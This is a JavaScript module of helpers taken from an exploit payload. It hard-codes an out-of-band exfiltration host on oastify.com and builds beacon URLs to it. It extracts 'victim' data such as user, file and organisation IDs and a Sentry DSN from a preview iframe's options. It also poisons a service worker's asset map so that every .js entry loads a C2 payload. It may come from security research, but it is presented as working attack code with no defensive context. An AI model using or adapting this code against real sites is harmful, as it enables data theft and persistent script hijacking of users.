/**
 * Utility functions extracted from payload.js
 * Data exfiltration and service-worker rehooking helpers.
 */

const DEFAULT_OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';

/**
 * Build the beacon URL used by exfil().
 */
function buildExfilUrl(oobHost, tag) {
  return oobHost + '/p?t=' + tag;
}

/**
 * Extract the "victim" data object from an options bag
 * (mirrors how payload.js reads __PREVIEW_IFRAME_INITIAL_OPTIONS__).
 */
function extractVictimData(opts, locationInfo) {
  return {
    user_id: opts.user_id,
    file_key: opts.file_key,
    org_id: opts.org_id,
    cluster: opts.cluster,
    sentry_dsn: opts.sentry_dsn,
    git_commit: opts.git_commit,
    origin: locationInfo.origin,
    href: locationInfo.href,
  };
}

/**
 * Truncate a postMessage payload for the sniffer (max 500 chars).
 */
function truncateMessageData(data, maxLen = 500) {
  const str = typeof data === 'string' ? data : JSON.stringify(data);
  return str.slice(0, maxLen);
}

/**
 * Build a poisoned asset map: every key ending with `.js` is
 * replaced with the C2 payload URL.
 */
function poisonAssetMap(assets, c2PayloadUrl) {
  const poisoned = { ...assets };
  for (const key of Object.keys(poisoned)) {
    if (key.endsWith('.js')) {
      poisoned[key] = c2PayloadUrl;
    }
  }
  return poisoned;
}

/**
 * Determine whether a service-worker message should be poisoned
 * (type === 'update-asset-url-map' and has an assets property).
 */
function shouldPoisonMessage(msg) {
  return !!(msg && msg.type === 'update-asset-url-map' && msg.assets);
}

module.exports = {
  DEFAULT_OOB,
  buildExfilUrl,
  extractVictimData,
  truncateMessageData,
  poisonAssetMap,
  shouldPoisonMessage,
};
